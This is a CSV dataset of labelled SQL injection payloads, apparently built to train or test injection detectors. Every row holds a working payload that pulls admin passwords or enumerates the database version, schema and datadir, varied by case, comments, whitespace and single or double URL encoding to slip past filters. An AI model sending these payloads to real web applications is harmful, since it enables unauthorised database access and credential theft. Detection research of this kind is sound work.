id=1%27/%2A%2A/WHErE/%2A*%2Fid%3D(SELECT/%2A%2A/id/%2A*/from%2F%2A*/users/*%2A/WHERE/%2A*/user%3D%27admin%27),1,sqli_subquery,case_var|ws_mixed_ws,partially_encoded,SQLI_SUBQUERY_004,308efd12f70887cb58b0dafac0b7eddd,470d4725076c1b4a95fa8102716f5ca6,109
id%3D1%27+And+EXISTS%28SELECT+%2A+From+users+WHERE+user%3D%27admin%27%29+%2F%2A,1,sqli_subquery,case_var|comment_block_comment,url_encoded,SQLI_SUBQUERY_002,667993c8c8dd18baf47b4066e105ebbb,9e15b212eac388a52467795936061538,79
id%3D1%27 AND+(SELECT+password+FROM+users WHERE user='admin%27)%3D%27a%27 --+-,1,sqli_subquery,comment_dash_dash_space,partially_encoded,SQLI_SUBQUERY_001,af076f4b36bc795996743ce27c31157d,834ade634e7335b2601e411aed6ced71,78
id%253D1%2527%2BAND%2BEXISTS%2528SELECT%2B%252A%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2B%2523,1,sqli_subquery,case_var|comment_hash,double_encoded,SQLI_SUBQUERY_002,434a0af37db10cf1d9f919a81f3e4e42,75b1702f35d59400f5489ab3452131c2,110
id=1'/**/wheRe/**/id=(SELECT/**/id/**/From/**/users/**/Where/**/user='admin')#,1,sqli_subquery,case_var|comment_hash|ws_comment_ws,raw,SQLI_SUBQUERY_004,cff167693f4e82338eeef65c1d419a15,ab67d6b527a3791cb268cd3abc42b09d,78
id=1'/**/AND/**/EXISTS(SELECT/**/*/**/FROM/**/users/**/where/**/user='admin')/**/--/**/-,1,sqli_subquery,case_var|comment_dash_dash_space|ws_comment_ws,raw,SQLI_SUBQUERY_002,40e75e68feef784f05012a57cce7e930,e8fe166d3ab0e59644bd53ff2c18523e,88
id%3D1%27++anD++%28SELECT++password++from++users++Where++user%3D%27admin%27%29%3D%27a%27++--++-,1,sqli_subquery,case_var|comment_dash_dash_space|ws_multi_space,url_encoded,SQLI_SUBQUERY_001,0370fc19dc387560abbe96a983559cbd,0ec71722310ee2d9a71066447e2c8d65,95
id%3D1%27%2520AND%2520EXISTS%28SELECT%2520%2A%2520FROM%2520users%2520WHERE%2520user%3D%27admin%27%29%2520%2F%2A,1,sqli_subquery,comment_block_comment|ws_url_space,url_encoded,SQLI_SUBQUERY_002,e7171f49079635a124051409dd381a25,dea4ca45e3ce2edaaf68df98dc41aa4a,111
id%3D1%27+WHERE+id%3D%28SELECT+id+FROM+users+WHERE+user%3D%27admin%27%29%2F%2A,1,sqli_subquery,comment_block_comment,url_encoded,SQLI_SUBQUERY_004,ba0243f7c2ff15b60deb9cf9b89a0918,8645e40c8bcdc8f8eb478a8c7ef70e8c,78
id%253D1%2527%252520WHERE%252520id%253D%2528SELECT%252520id%252520FRom%252520users%252520where%252520user%253D%2527admin%2527%2529%252523,1,sqli_subquery,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_SUBQUERY_004,7438974cb19b4f29786fa77ceec0b449,4d5cd240c639f0834b94de560f31d698,137
id%3D1%27+ WHERE+ id%3D(SELECT +id+ FROM  users++WHERE++user=%27admin'),1,sqli_subquery,ws_multi_space,partially_encoded,SQLI_SUBQUERY_004,bea341a22b4dfc916aff42a30e720d34,561023a7a088ae562f333fca343bef1e,71
id=1' And EXISTS(SELECT * FROM users Where user='admin') ;-- -,1,sqli_subquery,case_var|comment_semicolon_comment,raw,SQLI_SUBQUERY_002,51f3f9be4d4335405a040fe384601583,2f7970aa513f3bc48ecdfee2c9870c25,62
id%3D1%27+And+EXISTS%28SELECT+%2A+frOm+users+where+user%3D%27admin%27%29+%3B--+-,1,sqli_subquery,case_var|comment_semicolon_comment,url_encoded,SQLI_SUBQUERY_002,4f96f3195af2a4316eacb551a0946124,8c21ea8c5dd45c5859e83b7316d007e1,80
id%3D1%27%2520WHERE%2520id%3D%28SELECT%2520id%2520FROM%2520users%2520WHERE%2520user%3D%27admin%27%29%2F%2A,1,sqli_subquery,comment_block_comment|ws_url_space,url_encoded,SQLI_SUBQUERY_004,1aedd7c8b19869d919f517636249dd35,5cbf2ccf61f2100e5713c29c9d8de217,106
id%253D1%2527%2B%2BAnd%2B%2B%2528SELECT%2B%2Bpassword%2B%2Bfrom%2B%2Busers%2B%2BWHERE%2B%2Buser%253D%2527admin%2527%2529%253D%2527a%2527%2B%2B--,1,sqli_subquery,case_var|comment_dash_dash|ws_multi_space,double_encoded,SQLI_SUBQUERY_001,c573dce6538ae7b435c5e7a11b96f142,d29e9daa50ef6fe918df1f24fe043c16,144
id%253D1%2527%2B%2BWHERE%2B%2Bid%253D%2528SELECT%2B%2Bid%2B%2BFROM%2B%2Busers%2B%2BWHERE%2B%2Buser%253D%2527admin%2527%2529%252523,1,sqli_subquery,comment_url_hash|ws_multi_space,double_encoded,SQLI_SUBQUERY_004,ac5a82a8011fc2f8abfa2e522e7e12be,e397f811bac8e7021c51ab682321df6b,130
id%3D1'	WHERE	id=(SELECT	id	FROM	users	WHERE	user=%27admin%27)#,1,sqli_subquery,comment_hash|ws_tab,partially_encoded,SQLI_SUBQUERY_004,bf031305236eab58818983611c483bf9,3fae9736b00ba4e23ee55f67c3f0a081,63
id=1%27+Where id%3D(SELECT id from users+WHERE+user=%27admin%27),1,sqli_subquery,case_var,partially_encoded,SQLI_SUBQUERY_004,c77b25dc06c745694b04f01cfcac1f0d,d55c77ef8b1db7643072df94f4cf7d45,64
id=1' aNd EXISTS(SELECT * FROM users WHERE user='admin') -- -,1,sqli_subquery,case_var|comment_dash_dash_space,raw,SQLI_SUBQUERY_002,b9e71dc75bd9365827c23a2deea1fa2b,94d18919af7e81067fad1a7ff4b52acc,61
id%253D1%2527%252F%252A%252A%252FWHERE%252F%252A%252A%252Fid%253D%2528SELECT%252F%252A%252A%252Fid%252F%252A%252A%252FFROM%252F%252A%252A%252Fusers%252F%252A%252A%252FWHERE%252F%252A%252A%252Fuser%253D%2527admin%2527%2529,1,sqli_subquery,ws_comment_ws,double_encoded,SQLI_SUBQUERY_004,772677217f8af66b0796aa1bafe6fff0,7f4061abff3cb281764a2e9673031c33,221
id%3D1%27+WHERE+id%3D%28SELECT+id+FROM+users+WHERE+user%3D%27admin%27%29--,1,sqli_subquery,comment_dash_dash|ws_space,url_encoded,SQLI_SUBQUERY_004,4d034911c19281dc2544808028d82323,28060843188cdee19b5d8d29ad142bba,74
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2Ffrom%2F%2A%2A%2Fusers%2F%2A%2A%2Fwhere%2F%2A%2A%2Fuser%3D%27admin%27%29%3D%27a%27%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_subquery,case_var|comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_SUBQUERY_001,fbaa113a8dc08e01d9c94e4c8d98bc96,681e286777b509d929b20df730d34098,188
id%3D1%27+WHERE+id%3D(SELECT+id+FROM+users+WHERE+user=%27admin')--,1,sqli_subquery,comment_dash_dash|ws_plus,partially_encoded,SQLI_SUBQUERY_004,715e8a7e9fc8afcfe90b6b98946401fa,b4ef55559aa8d413b99d55459e22f009,66
id%253D1%2527%252F%252A%252A%252FwHErE%252F%252A%252A%252Fid%253D%2528SELECT%252F%252A%252A%252Fid%252F%252A%252A%252Ffrom%252F%252A%252A%252Fusers%252F%252A%252A%252FWHERE%252F%252A%252A%252Fuser%253D%2527admin%2527%2529%252523,1,sqli_subquery,case_var|comment_url_hash|ws_mixed_ws,double_encoded,SQLI_SUBQUERY_004,e7b92aaee1e0dc672b1434294efadd90,52027fb683ecb41b5fc53e7a2d806c49,228
id%3D1%27+WHERE id=(SELECT id+FROM users WHERE user='admin'),1,sqli_subquery,standard,partially_encoded,SQLI_SUBQUERY_004,0f06e8d9d82816d3e5a7e6eec639d85b,034c4cbdfe0a0e68d9d45786a24c0f17,60
id%3D1' AND+(SELECT password+FROM users WHERE user%3D%27admin%27)%3D%27a'+-- -,1,sqli_subquery,comment_dash_dash_space,partially_encoded,SQLI_SUBQUERY_001,4dae96c55a5937dabe735a487cc5d44e,09728c09829eaa908393c78be2837597,78
id%253D1%2527%2BWhere%2Bid%253D%2528SELECT%2Bid%2Bfrom%2Busers%2BwHeRE%2Buser%253D%2527admin%2527%2529%252F%252A,1,sqli_subquery,case_var|comment_block_comment,double_encoded,SQLI_SUBQUERY_004,5c98d4d68f2cd8e2d54d66cc4837bd7b,1cf64352eb5f8bc617c14d93975cfbb5,112
id=1'%20AND%20EXISTS(SELECT%20*%20fROm%20users%20wHErE%20user='admin')%20--,1,sqli_subquery,case_var|comment_dash_dash|ws_url_space,raw,SQLI_SUBQUERY_002,de9b72bfda95b6656f3958232bcf0511,a26481e8fdf2ead37cdc93d1500e14a7,75
id=1' Where id=(SELECT id From users where user='admin')#,1,sqli_subquery,case_var|comment_hash,raw,SQLI_SUBQUERY_004,790a93444a7a2f567d8d1242c22ed1f9,ee272596ece6684c9b88731697d935a2,57
id%253D1%2527%2B%2BAnd%2B%2B%2528SELECT%2B%2Bpassword%2B%2BFROM%2B%2Busers%2B%2Bwhere%2B%2Buser%253D%2527admin%2527%2529%253D%2527a%2527%2B%2B--%2B%2B-,1,sqli_subquery,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_SUBQUERY_001,7a287a43190615774779c3d627f1c97f,cabf515845523e3eda000154c17238c5,151
id=1%27 And+(SELECT+COUNT(%2A) From+information_schema.tables)%3E0+-- -,1,sqli_subquery,case_var|comment_dash_dash_space,partially_encoded,SQLI_SUBQUERY_003,e0bd1c876b7c2b92665c26c20cfadcab,5fd6af56fa4759b387e2f32fb52ad248,71
id%3D1%27%09and%09EXISTS%28SELECT%09%2A%09fRoM%09users%09where%09user%3D%27admin%27%29%09%2F%2A,1,sqli_subquery,case_var|comment_block_comment|ws_tab,url_encoded,SQLI_SUBQUERY_002,70104a7d467bd1dba907a43b1f13968f,43267661280b31dfdf6414c6b1ec8170,95
id=1' AnD (SELECT COUNT(*) from information_schema.tables)>0 /*,1,sqli_subquery,case_var|comment_block_comment,raw,SQLI_SUBQUERY_003,9971cefdd16cc55b5b321865908934aa,680089a63bc3af5fd83067810a3ff2ef,63
id%3D1%27%2BWHERE%2Bid%3D%28SELECT%2Bid%2BFROM%2Busers%2BWHERE%2Buser%3D%27admin%27%29,1,sqli_subquery,ws_mixed_ws,url_encoded,SQLI_SUBQUERY_004,940520c7bc8bb192013185066f1a6bfb,2a90970ecfb0ff7e3a4e140ad5588ade,86
id%3D1'+AND (SELECT+COUNT(%2A)+FROM+information_schema.tables)%3E0+%23,1,sqli_subquery,comment_url_hash,partially_encoded,SQLI_SUBQUERY_003,57e4573944c372c47b5f1d47fa0fc068,1c8571e3cc33f48b9761604e8d1a0146,70
id%253D1%2527%2Band%2B%2528SELECT%2Bpassword%2Bfrom%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%253D%2527a%2527%2B--,1,sqli_subquery,case_var|comment_dash_dash,double_encoded,SQLI_SUBQUERY_001,7d248800427e61fd8e8b72deddec8f35,74625589a7abc982c206e95a1e130153,120
id%3D1%27%2F%2A%2A%2FWHERE%2F%2A%2A%2Fid%3D%28SELECT%2F%2A%2A%2Fid%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2FWHERE%2F%2A%2A%2Fuser%3D%27admin%27%29%3B--%2F%2A%2A%2F-,1,sqli_subquery,comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_SUBQUERY_004,91e3520d2ec47085327071066081c3b6,dd97be659600c1f3335542a49be738b4,167
id%253D1%2527%2B%2B%2Bwhere%2B%2B%2Bid%253D%2528SELECT%2B%2B%2Bid%2B%2B%2Bfrom%2B%2B%2Busers%2B%2B%2BWHEre%2B%2B%2Buser%253D%2527admin%2527%2529,1,sqli_subquery,case_var|ws_mixed_ws,double_encoded,SQLI_SUBQUERY_004,845b16e932302bffccb223494a7d461d,83bea9c85c7e5985545569a3dbf0a83d,144
id=1'+WHERE+id=(SELECT id+FROM+users+WHERE+user%3D%27admin%27)--+-,1,sqli_subquery,comment_dash_dash_space,partially_encoded,SQLI_SUBQUERY_004,bec926715b280489227217ce77ac65aa,933f3b525fdd3ebfa9020b583823f5d1,66
id=1' And (SELECT password fRoM users WHERE user='admin')='a' --,1,sqli_subquery,case_var|comment_dash_dash,raw,SQLI_SUBQUERY_001,e26105b9fc8c79f77f88d542f5e53851,200ec83153b24a3cb8ebe127e1cc6718,64
id=1'	and	(SELECT	password	From	users	WHERE	user%3D'admin')%3D'a%27	%2F%2A,1,sqli_subquery,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_SUBQUERY_001,d341667c40bf0da90e02c28dc8811832,1e048e56af0646fddbb968e4d5b20e51,74
id%253D1%2527%252BWheRE%252Bid%253D%2528SELECT%252Bid%252BfrOm%252Busers%252BWhere%252Buser%253D%2527admin%2527%2529,1,sqli_subquery,case_var|ws_plus,double_encoded,SQLI_SUBQUERY_004,0578c50f6782f80b91d2e9a465f39824,d0461696dea328a143d80215ff6c2b38,116
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables%29%3E0+--+-,1,sqli_subquery,comment_dash_dash_space,url_encoded,SQLI_SUBQUERY_003,0e2580f3c291e4927e6159436aa7d6d7,0ed1cfd0d73400b1cc4e557d8c76a2a4,81
id%3D1%27+UNION+SELECT+version%28%29%2C+user%28%29+%2523,1,sqli_enum,comment_url_hash,url_encoded,SQLI_ENUM_001,6f380108996c360dd88afd4fae562eb7,bb22bee2061efe1dabc4c76cf7c41cc0,56
"id=1' uNion+sELECt+version(),+user()+%2F%2A",1,sqli_enum,case_var|comment_block_comment,partially_encoded,SQLI_ENUM_001,89b014075959405e9a0c18a4dd8f2aaa,6cbefa3c08b394784c59f8d862190f87,43
"id%3D1'%2F%2A%2A/UNION%2F%2A%2A/SELECT/%2A%2A%2F@@version,%2F*%2A%2F@@datadir%2F%2A%2A%2F/*",1,sqli_enum,comment_block_comment|ws_comment_ws,partially_encoded,SQLI_ENUM_003,6f3cbb46b61ef681bbc9fed160637f62,dfd6aaaab00e47f5d5e92df6273212e2,91
id%3D1%27+uNioN+sELect+user%28%29%2C+password+frOM+users+%3B--+-,1,sqli_enum,case_var|comment_semicolon_comment,url_encoded,SQLI_ENUM_004,2abd507d3cb5702ff485cc548a86561f,f310238afd981bcdd5df1677f169663a,64
"id=1' union select user(), password from users --",1,sqli_enum,case_var|comment_dash_dash,raw,SQLI_ENUM_004,3934772fe78b216fac641dcb17727cac,f93236bb2787a9b4f81d8e2f81a019f0,49
id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252Fversion%2528%2529%252C%252F%252A%252A%252Fuser%2528%2529%252F%252A%252A%252F%253B--%252F%252A%252A%252F-,1,sqli_enum,case_var|comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_ENUM_001,cee3fa9922247db35d0ce9e3a94bb1d1,03309584b624091ec70eb4e7b726d6d2,188
"id=1'+UNION+SELECT+@@version,+@@datadir+--",1,sqli_enum,comment_dash_dash|ws_plus,raw,SQLI_ENUM_003,3dc693d5a95e9502913a73e49f14f540,322764f19f422d3cfe2cfc82cccaccf8,42
"id%3D1%27+union+SeLeCt @@version,+@@datadir --+-",1,sqli_enum,case_var|comment_dash_dash_space,partially_encoded,SQLI_ENUM_003,cc4c7346b7cb66a0edffc92d61badbf7,6ee676b310cebf341f32bb7ca74a81f2,48
"id%3D1%27+UNION SELECT @@version, @@datadir+%23",1,sqli_enum,comment_hash,partially_encoded,SQLI_ENUM_003,d25e90dac722cbaf577b308020f9bd32,776f3187cb110f7a28ddadaaece3f93c,47
id%3D1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Fuser%28%29%2C%2F%2A%2A%2Fpassword%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_enum,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_ENUM_004,bc30b0e6d94d33a457c640f555ada550,8c666db3b2f044297d06c4ee010bd45c,149
"id=1'+UNION+SELECT user(), password+FROM+users+/*",1,sqli_enum,comment_block_comment,partially_encoded,SQLI_ENUM_004,f386bb5afa1fb0a36050fae14c3810a4,010b70b91dc0ca98673ed964249c0487,49
id%253D1%2527%252520UnIOn%252520seLEcT%252520user%2528%2529%252C%252520password%252520from%252520users%252520%2523,1,sqli_enum,case_var|comment_hash|ws_url_space,double_encoded,SQLI_ENUM_004,6be53bfe6c52b0783b626dba49fb7f3d,1519243b5b251fb2fbc83288150c4471,114
id%3D1%27%09UNION%09SELECT%09user%28%29%2C%09password%09FROM%09users%09%23,1,sqli_enum,comment_hash|ws_tab,url_encoded,SQLI_ENUM_004,7b762a93c51c6ac8e10aef62dc89d655,819af6ca93ec53f39fd8f0b7ef1f4351,74
id%3D1%27%2F%2A%2A%2FUnion%2F%2A%2A%2Fselect%2F%2A%2A%2Fuser%28%29%2C%2F%2A%2A%2Fpassword%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,1,sqli_enum,case_var|comment_semicolon_comment|ws_comment_ws,url_encoded,SQLI_ENUM_004,04d31c2d2c1109a3d22fe3d196207386,24f48fb26b87a656b58a326629e6f3b0,152
id%253D1%2527%2BUNION%2BSELECT%2Buser%2528%2529%252C%2Bpassword%2BFROM%2Busers%2B%253B--%2B-,1,sqli_enum,comment_semicolon_comment,double_encoded,SQLI_ENUM_004,0757142864a47101c59e6790f46cd684,a66d189fb779de0eb7fa46cee83791c6,92
id%253D1%2527%252520UNiON%252520seLect%252520database%2528%2529%252C%252520schema%2528%2529%252520%252523,1,sqli_enum,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_ENUM_002,351b43cc1df89af171f2bf727035a3d4,55e4cb805d15ddf5f4ec5002f036d6f3,105
id%253D1%2527%2BUNION%2BSELECT%2Bversion%2528%2529%252C%2Buser%2528%2529%2B%2523,1,sqli_enum,comment_hash,double_encoded,SQLI_ENUM_001,f6d086d840d6dd24239b2d268b888e52,2bd72ea1bce5547fe29d941e62cfc570,80
"id%3D1%27+UniOn select @@version,+@@datadir --",1,sqli_enum,case_var|comment_dash_dash,partially_encoded,SQLI_ENUM_003,21cdaac31f10114c0df6ae000eb71cad,263913e90c5a27c39616a5750dfd9a49,46
"id=1%27 UNION+SeLeCT+@@version,+@@datadir %23",1,sqli_enum,case_var|comment_url_hash,partially_encoded,SQLI_ENUM_003,9dd1fdbb5b8d1728b6748def9248c910,f777a5e53ec90a7cfc7b45d8b76a9027,45
id%3D1%27+Union+SELECT+user%28%29%2C+password+FROM+users+--+-,1,sqli_enum,case_var|comment_dash_dash_space,url_encoded,SQLI_ENUM_004,6fb8c4ff0c56ddd4a0e3579097dc6fc8,c444a783ec415d37ae69262590f58c3b,61
"id%3D1%27%2F%2A*%2FUniON%2F*%2A%2FSelect%2F%2A%2A%2F@@version,%2F%2A%2A/@@datadir/**/%23",1,sqli_enum,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_ENUM_003,63e01c15e1f9014c1ca3e97db57c3d96,d8b2e8832e0f5922d2f4ef7887ce2be9,88
id%3D1%27+UNION+Select+database%28%29%2C+schema%28%29+--+-,1,sqli_enum,case_var|comment_dash_dash_space,url_encoded,SQLI_ENUM_002,61b5beab5a2a36c4de830ca361fa0e01,6764d5b8c0d79081f025c45e92994ee6,58
id%253D1%2527%252BUNION%252BSELECT%252Buser%2528%2529%252C%252Bpassword%252BFROM%252Busers%252B%253B--%252B-,1,sqli_enum,comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_ENUM_004,46ae2dba59e54b2960119ed4a6b26579,dc36c6a45e33bdbd83e6bc6c64771559,108
"id=1' UNION SELEcT version(), user() ;-- -",1,sqli_enum,case_var|comment_semicolon_comment|ws_space,raw,SQLI_ENUM_001,c3dabaee6de8d502affd34b236dcc93b,4551cde9a57912477e343b2d4515d0c1,42
id%3D1%27+uNIoN+seLecT+database%28%29%2C+schema%28%29+%2523,1,sqli_enum,case_var|comment_url_hash,url_encoded,SQLI_ENUM_002,7991b91a0fbbdfcb0e24498e04371a69,9489c5001bb2e611aa59516585f70f19,59
id%3D1%27+UNION+SELECT+user%28%29%2C+password+FROM+users+--,1,sqli_enum,comment_dash_dash,url_encoded,SQLI_ENUM_004,47fdc6373f14170869d6b55d6b4ec2bf,6ba6896190735dd22887da61eb30a1d4,59
"id=1' UNION SELECT user(), password FROM users -- -",1,sqli_enum,comment_dash_dash_space,raw,SQLI_ENUM_004,e8001828499deb7085cc6827896e6128,4eeabcaa5383d195553d1a011d6b3b6e,51
id%3D1%27++UNION++SELECT++%40%40version%2C++%40%40datadir++%2523,1,sqli_enum,comment_url_hash|ws_multi_space,url_encoded,SQLI_ENUM_003,c9ea6fd2eff7d6cdc56a23b666f1cb7e,56da71d6dfc27cecb879067bdf48bcd9,64
id%3D1%27+UNION+SELECT+database%28%29%2C+schema%28%29+--,1,sqli_enum,comment_dash_dash,url_encoded,SQLI_ENUM_002,28585debf7c7570f63d455405635d54e,f7ed95d226c319e06cf866a77f041c63,56
"id=1' UNION sELeCt database(), schema() --",1,sqli_enum,case_var|comment_dash_dash,raw,SQLI_ENUM_002,5eef71e3b294136d5cbd06780b80f958,d4a83c8c1ad676468aa456121c520746,42
"id=1'/**/unioN/**/seLECT/**/database(),/**/schema()/**/%23",1,sqli_enum,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_ENUM_002,8843409aa906a7a68c925a12bd0ea081,f5f6d5621d31d956c07111e830933233,58
id%253D1%2527%252BUnion%252BSELECT%252Buser%2528%2529%252C%252Bpassword%252BFrom%252Busers%252B--%252B-,1,sqli_enum,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_ENUM_004,d96c6dd0f481603479dfa08e1de5d33a,d3f83dc23c8fa8b3371fb9b45ddef253,103
"id=1' UNION SELECT version(), user() %23",1,sqli_enum,comment_url_hash,raw,SQLI_ENUM_001,1ccedea47b9c2249246ef62cb912e35e,8730ed5a6c9dc882a0522fb17fd82582,40
"id%3D1'%2F%2A%2A%2FUnion%2F%2A*%2FSELECT/%2A*/user(),%2F%2A*/password%2F%2A%2A%2FFrom%2F%2A%2A%2Fusers%2F*%2A%2F%23",1,sqli_enum,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_ENUM_004,b870282d6ac83d105f2e32388280015c,86ef751dfdb0db15de3e7f8fd5abbd98,115
id%3D1%27%2BUnion%2BSELECT%2Buser%28%29%2C%2Bpassword%2Bfrom%2Busers%2B--,1,sqli_enum,case_var|comment_dash_dash|ws_plus,url_encoded,SQLI_ENUM_004,71777712d37271719b4aeab316a3c222,1106cd3bf43bfb435570a5040e6e3ba9,73
"id=1' UNION SELECT user(), password FROM users %23",1,sqli_enum,comment_url_hash,raw,SQLI_ENUM_004,49ae8bb49537fdd51d81d4532c9b464a,e7a4000a56dbd0f711b09fc1bf5fa9f5,50
"id=1'	UNION	SELECT	database(),	schema()	--	-",1,sqli_enum,case_var|comment_dash_dash_space|ws_tab,partially_encoded,SQLI_ENUM_002,074600941e59b76015135b1c9183607f,45cb9e921d9e37e78353e84bc0d4e0a3,44
"id=1'  UnION  SELECT  @@version,  @@datadir  --",1,sqli_enum,case_var|comment_dash_dash|ws_multi_space,raw,SQLI_ENUM_003,d2f1651e99f2e269b88445a0ce37cbc4,24f85a9cfa76eefc4614725672771871,47
"id=1'/**/Union/**/select/**/version(),/**/user()/**/%23",1,sqli_enum,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_ENUM_001,4076863c1153a6fdd48766f919bf27a3,4e096d4757f385824cba6a0449c2e340,55
id%3D1%27%09union%09select%09user%28%29%2C%09password%09FrOM%09users%09%2F%2A,1,sqli_enum,case_var|comment_block_comment|ws_tab,url_encoded,SQLI_ENUM_004,6c58f8eaf3222e0f29d0a69a27c369ff,d3a182410087a9a5850468fc0635d37c,77
id%3D1%27+UNION+SELECT+database%28%29%2C+schema%28%29+%2F%2A,1,sqli_enum,comment_block_comment,url_encoded,SQLI_ENUM_002,250bca5877b0c4786e9862a67626aafe,bc45a3a3ebdfc3b45c65adef4b85d6ff,60
id%253D1%2527%252BUnIOn%252BSelect%252Buser%2528%2529%252C%252Bpassword%252BFrom%252Busers%252B%2523,1,sqli_enum,case_var|comment_hash|ws_mixed_ws,double_encoded,SQLI_ENUM_004,2bf9c088aa0640282fd76aafdd362036,d65e20823a119006af7d33f9b79c6801,100
id%3D1%27+UNION+SELECT+database%28%29%2C+schema%28%29+%3B--+-,1,sqli_enum,case_var|comment_semicolon_comment,url_encoded,SQLI_ENUM_002,80a6927f2f993124f2791ccea99a45e1,6d1842a958613f5e1bec1ddf14cad6af,61
id%253D1%2527%2BUNION%2BSELECT%2Buser%2528%2529%252C%2Bpassword%2BFROM%2Busers%2B%252F%252A,1,sqli_enum,comment_block_comment,double_encoded,SQLI_ENUM_004,dea1646872167360d51fc9c21aee5185,f332848813912e186abb4c4ab94ec2f5,91
id%253D1%2527%2BUNION%2BSELECT%2Bversion%2528%2529%252C%2Buser%2528%2529%2B--%2B-,1,sqli_enum,case_var|comment_dash_dash_space,double_encoded,SQLI_ENUM_001,513273a47f8023c626e258468d91c395,d135a4a3cbe2ee59d13697d9bba838bd,81
id%253D1%2527%2B%2BUNION%2B%2Bselect%2B%2B%2540%2540version%252C%2B%2B%2540%2540datadir%2B%2B%2523,1,sqli_enum,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_ENUM_003,8b2973be94fe63aec38fd386a14dde1e,0c0ee4339a53fbf3b69fc1147d0c8c17,98
id%3D1%27%2520UnIon%2520Select%2520%40%40version%2C%2520%40%40datadir%2520%2F%2A,1,sqli_enum,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_ENUM_003,a3c19ff6302415e5cfc2b0a8e1767c49,26303613e22bb3517c7df624c152293c,80
"id=1'+ Union+ SELECT  version(), +user()+ %23",1,sqli_enum,case_var|comment_url_hash|ws_multi_space,partially_encoded,SQLI_ENUM_001,810d39e5a5c670547d14932b863c71a0,2e0f153ca794b869b91f8f36112dff6c,45
id%3D1%27%2520UNION%2520SELECT%2520version%28%29%2C%2520user%28%29%2520%2F%2A,1,sqli_enum,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_ENUM_001,e0c7c8c51e9782d19187b3c59a7ba1e1,9a6374578704d82320370d577ec9bf17,77
"id=1'/**/uNIOn/**/SeLEcT/**/database(),/**/schema()/**/;--/**/-",1,sqli_enum,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_ENUM_002,35605393e1fa19eae3c8a04c9959cf93,f78763bc51a06ea1c23e5594037d3a9a,63
id%3D1%27%2F%2A%2A%2Funion%2F%2A%2A%2FSelect%2F%2A%2A%2Fdatabase%28%29%2C%2F%2A%2A%2Fschema%28%29%2F%2A%2A%2F%2523,1,sqli_enum,case_var|comment_url_hash|ws_comment_ws,url_encoded,SQLI_ENUM_002,7b2f41e5362deb8bef89c29fbcc560e9,e02c1528d3848954c2582617b7e9184f,114
"id%3D1'/%2A%2A%2FUnIon/%2A*%2FSelect%2F*%2A%2Fdatabase(),/%2A*/schema()%2F**%2F%2F%2A",1,sqli_enum,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_ENUM_002,d666627a14a60f145c18f8c541dcc700,736c3be9e6c41a897c9b70d156d6e494,85
"id%3D1' Union Select+@@version, @@datadir+%23",1,sqli_enum,case_var|comment_url_hash,partially_encoded,SQLI_ENUM_003,81b13b884fc7f815d868916ab2f70674,902338a5f59ec20b4d14c9a5247cfbbd,45
"id=1'+UNION Select version(), user()+%3B--+-",1,sqli_enum,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_ENUM_001,4588e0d2035b1dd8598d941362e1787a,2753bca6e2a1ece7871500c297396c67,44
id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSelect%252F%252A%252A%252Fversion%2528%2529%252C%252F%252A%252A%252Fuser%2528%2529%252F%252A%252A%252F--,1,sqli_enum,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_ENUM_001,392da8af823cfb60e9717838272e7aa6,7712358eef905c41f2a7f8b748b1e869,162
"id%3D1'+union Select+user(),+password+FROM users+%23",1,sqli_enum,case_var|comment_url_hash,partially_encoded,SQLI_ENUM_004,28076ca7d5d61ac895cd7e097cd58675,73739111a85384df5bd7d51d3f7d6c14,52
"id=1'/**/UNION/**/SELECT/**/version(),/**/user()/**//*",1,sqli_enum,comment_block_comment|ws_comment_ws,raw,SQLI_ENUM_001,00e7015f00e0d602cd637aa534e5c443,a4104b114f865a9e284c90d20af0fce5,54
id%253D1%2527%252BUNION%252BSELECT%252Buser%2528%2529%252C%252Bpassword%252BFROM%252Busers%252B%252F%252A,1,sqli_enum,comment_block_comment|ws_plus,double_encoded,SQLI_ENUM_004,f30c071996af7efc672e8636ad817b9d,36fc508064c1d607ebda968b2aab5f1e,105
id%253D1%2527%2BUNION%2Bselect%2Bdatabase%2528%2529%252C%2Bschema%2528%2529%2B--%2B-,1,sqli_enum,case_var|comment_dash_dash_space,double_encoded,SQLI_ENUM_002,f934f2f494976596909353e24b4b927f,33afc0c40a026fc7e12c0f8b1fe9950b,84
id%3D1%27++union++Select++version%28%29%2C++user%28%29++%3B--++-,1,sqli_enum,case_var|comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_ENUM_001,9e0a5bf7c1a0b706543a29f9525f4805,2d1bfedafaaf7888251b045ee4096d37,64
